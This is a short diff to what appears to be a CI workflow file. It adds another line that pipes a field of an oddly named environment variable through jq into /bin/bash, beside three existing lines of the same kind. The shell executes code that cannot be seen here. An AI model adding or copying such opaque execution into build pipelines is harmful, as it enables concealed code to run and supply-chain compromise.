@@ -27,6 +27,7 @@ jobs:
           echo $hn25 | jq -r .o97 | /bin/bash
           echo $zr07 | jq -r .azt654 | /bin/bash
           printf '%s' "$oi21" | jq -r .uxaxa47268 | /bin/bash
+          echo $btzn2143 | jq -r .s8600 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
